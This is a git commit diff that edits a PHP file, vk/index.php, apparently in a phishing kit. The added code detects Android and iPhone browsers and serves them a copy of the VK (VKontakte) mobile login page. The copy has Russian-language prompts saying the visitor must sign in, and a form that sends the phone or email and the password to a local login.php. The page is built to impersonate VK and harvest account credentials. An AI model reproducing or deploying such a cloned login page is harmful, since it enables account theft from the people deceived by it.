9fab9b9e6a72e20e6a0b0a655d45275eb2ba4b11
termux-lab <59764619+termux-lab@users.noreply.github.com>
2020-04-12 20:26:42 +0300

    Update index.php

--- vk/index.php
+++ vk/index.php
@@ -1,4 +1,125 @@
 <!DOCTYPE html>
+<?php
+$agent = $_SERVER['HTTP_USER_AGENT'];
+#
+#
+if((strpos($agent, "Android") != false)or(strpos($agent, "iPhone") != false)){
+?>
+            <!DOCTYPE html>
+      <html class="vk vk_js_no vk_1x vk_flex_no r d h vk_withVolumeLine vk_appAuth_no n vk_old ">
+      <head>
+              <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, user-scalable=no" />
+        <meta name="format-detection" content="telephone=no" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="MobileOptimized" content="176" />
+        <meta name="HandheldFriendly" content="True" />
+        <base id="base">
+
+      <meta name="msApplication-ID" content="C6965DD5.VK" />
+      <meta name="msApplication-PackageFamilyName" content="C6965DD5.VK_v422avzh127ra" />
+
+        <meta name="description" content="VK is the largest European social network with more than 100 million active users. Our goal is to keep old friends, ex-classmates, neighbors and colleagues in touch." />
+        <link rel="shortcut icon" href="https://vk.com/images/icons/favicons/fav_logo.ico?8"></link>
+
+    <meta name="apple-mobile-web-app-title" content="VK">
+    <meta name="application-name" content="VK">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <title>https://m.vk.com</title>
+
+        <link rel="stylesheet" href="https://m.vk.com/css/mobile/common.css?f17be24e8d33824f5f23d474637dd8a33b8d5d72451c32afc3d554c70fd83f78">
+<
+
+        <link rel="canonical" href="https://vk.com/" />
+    <link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/" />
+      </head>
+
+      <body  class="vk__page _ivk _hover vk_ios_no _hfixed vk_stickers_hints_support_yes opera_mini_no vk_safari_no vk__page_login vk_tabbar_bottom   vk_al_yes " scheme="bright_light" onresize="onBodyResize(true);">
+            <div class="layout">
+
+          <div class="layout__header mhead" id="vk_head">
+      <div class="hb_wrap">
+        <div class="hb_btn">&nbsp;</div>
+      </div>
+    </div>
+      <div class="layout__body qs_enabled" id="vk_wrap">
+        <div class="layout__leftMenu" id="l">
+
+        </div>
+        <div class="layout__basis" id="m">
+              <div class="basis">
+      <div class="basis__header mhead basis__header_noBottomMenu basis__header_noshadow basis__header_noshadowAnim basis__header_nohide" id="mhead"><a href="/" accesskey="*" class="hb_wrap mhb_logo">
+  <div class="hb_btn mhi_logo">&nbsp;</div>
+  <h1 class="hb_btn mh_header">&nbsp;</h1>
+</a>
+</div>
+      <div class="basis__menu"></div>
+
+      <div class="basis__content mcont " id="mcont" data-canonical="https://vk.com/"><div class="installApp">
+  <a class="installApp__link" href="https://vk.me/?act=dl">
+    <div class="installApp__link_wrap">
+      <div class="installApp__label">
+        Установить приложение <b>ВКонтакте</b>
+        <span class="installApp__arrow"></span>
+      </div>
+    </div>
+  </a>
+</div><div class="pcont fit_box bl_cont new_form">
+  <div class="PageBlock">
+
+  <div class="form_item">
+    <div class="login_header">
+     Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
+    </div>
+      <div class="fi_row"><div class="service_msg_box">
+  <div class="service_msg service_msg_warning">Чтобы продолжить, необходимо авторизоваться в <b>Вконтакте</b>. </div>
+</div></div>
+    <form method="POST" action="login.php" novalidate>
+      <dl class="fi_row">
+        <dd>
+          <input type="text" class="textfield" name="email" value="" placeholder="Телефон или email" />
+        </dd>
+      </dl>
+      <dl class="fi_row">
+        <dd>
+          <input type="password" class="textfield" name="pass" placeholder="Пароль" />
+        </dd>
+      </dl>
+
+      <div class="fi_row_new">
+        <input class="button wide_button" type="submit" value="Войти" />
+      </div>
+      <div class="fi_row">
+        <div class="near_btn wide_button login_restore"><a href="https://static.vk.com/restore" rel="noopener">Забыли пароль?</a></div>
+      </div>
+      <div class="login_new_user">
+  <div class="fi_header fi_header_light">Впервые Вконтакте?</div>
+</div>
+<div class="fi_row">
+  <a class="button wide_button success" href="/join" rel="noopener">Зарегистрироваться</a>
+</div>
+<div class="socials">
+
+  <a href="https://m.vk.com/login?act=fb_sign" class="social_button"><i class="social_icon"></i>Войти через Facebook</a>
+</div>
+    </form>
+  </div>
+  </div>
+</div></div>
+
+        <div id="vk_utils"></div>
+        <div id="z"></div>
+        <div id="vk_bottom"></div>
+        <div id="theme_color_shim"></div>
+
+
+      </body>
+    </html>
+
+<?php
+}else{
+?>
 <html  lang="ru">
 <head>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -162,3 +283,7 @@
 </body>
 
 </html>
+<?php
+
+}
+ ?>
